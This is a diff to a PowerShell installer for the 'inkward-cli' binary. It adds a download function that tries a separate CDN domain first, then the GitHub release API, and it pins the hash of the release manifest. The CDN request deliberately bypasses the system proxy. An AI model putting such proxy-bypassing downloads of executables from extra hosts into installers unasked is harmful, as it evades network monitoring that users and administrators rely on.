@@ -24,8 +24,48 @@ New-Item -ItemType Directory -Path $temp | Out-Null
 $exitCode = 1
 try {
   [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
+  $script:endpoints = @{}
+  $script:apiLoaded = $false
+  function Get-ReleaseAsset([string]$Name, [string]$Target) {
+    # The direct exception is scoped to this single first-party request.
+    $response = $null; $stream = $null; $file = $null
+    try {
+      $request = [Net.HttpWebRequest]::Create("https://static.rimbaud.asia/releases/eb87c3e97e94dbcb/cli/v2.0.0/$Name")
+      $request.Proxy = $null; $request.Timeout = 15000; $request.ReadWriteTimeout = 30000; $request.AllowAutoRedirect = $false
+      $response = $request.GetResponse()
+      if ([int]$response.StatusCode -ne 200) { throw 'Unexpected CDN response' }
+      $stream = $response.GetResponseStream(); $file = [IO.File]::Create($Target)
+      $buffer = New-Object byte[] 65536; $total = 0
+      while (($count = $stream.Read($buffer,0,$buffer.Length)) -gt 0) {
+        $total += $count; if ($total -gt 20971520) { throw 'Unexpected download size' }
+        $file.Write($buffer,0,$count)
+      }
+      return
+    } catch { Write-Warning 'Site CDN unavailable; trying the official GitHub Release.' }
+    finally { if ($file) { $file.Dispose() }; if ($stream) { $stream.Dispose() }; if ($response) { $response.Dispose() } }
+    if (-not $script:apiLoaded) {
+      $script:apiLoaded = $true
+      try {
+        $release = Invoke-RestMethod -Uri "https://api.github.com/repos/Sodomking/inkward-cli/releases/tags/v$version" -TimeoutSec 20
+        foreach ($item in $release.assets) {
+          if ($item.name -in @($asset, 'SHA256SUMS')) {
+            if ($item.url -notmatch '^https://api\.github\.com/repos/Sodomking/inkward-cli/releases/assets/[0-9]+$') { throw 'Invalid official asset endpoint' }
+            $script:endpoints[$item.name] = $item.url
+          }
+        }
+      } catch { Write-Warning 'Official API unavailable; trying the standard Release download.'; $script:endpoints = @{} }
+    }
+    if ($script:endpoints.ContainsKey($Name)) {
+      try {
+        Invoke-WebRequest -UseBasicParsing -Uri $script:endpoints[$Name] -Headers @{ Accept = 'application/octet-stream' } -OutFile $Target -TimeoutSec 120
+        return
+      } catch { Write-Warning 'Official asset API unavailable; trying the standard download.' }
+    }
+    Invoke-WebRequest -UseBasicParsing -Uri "$base/$Name" -OutFile $Target -TimeoutSec 120
+  }
   $manifest = Join-Path $temp 'SHA256SUMS'
-  Invoke-WebRequest -UseBasicParsing -Uri "$base/SHA256SUMS" -OutFile $manifest -TimeoutSec 120
+  Get-ReleaseAsset 'SHA256SUMS' $manifest
+  if ((Get-FileHash $manifest -Algorithm SHA256).Hash.ToLowerInvariant() -ne 'eb87c3e97e94dbcb3e11d3efbb62e027354af024a90b69280fa6c6cb42eaa0d5') { throw 'Release manifest mismatch' }
   $matchesFound = @(Get-Content $manifest | Where-Object { $_ -match ('^[a-f0-9]{64}  ' + [regex]::Escape($asset) + '$') })
   if ($matchesFound.Count -ne 1) { throw 'Missing or invalid checksum' }
   $expected = $matchesFound[0].Substring(0,64)
@@ -34,7 +74,7 @@ try {
   if ((Test-Path $binary) -and -not ((Get-Item $binary).Attributes -band [IO.FileAttributes]::ReparsePoint)) { $actual = (Get-FileHash $binary -Algorithm SHA256).Hash.ToLowerInvariant() }
   if ($actual -ne $expected) {
     $download = Join-Path $temp 'inkward.exe'
-    Invoke-WebRequest -UseBasicParsing -Uri "$base/$asset" -OutFile $download -TimeoutSec 120
+    Get-ReleaseAsset $asset $download
     if ((Get-FileHash $download -Algorithm SHA256).Hash.ToLowerInvariant() -ne $expected) { throw 'Checksum mismatch; not executed' }
     Move-Item -LiteralPath $download -Destination $binary -Force
   }
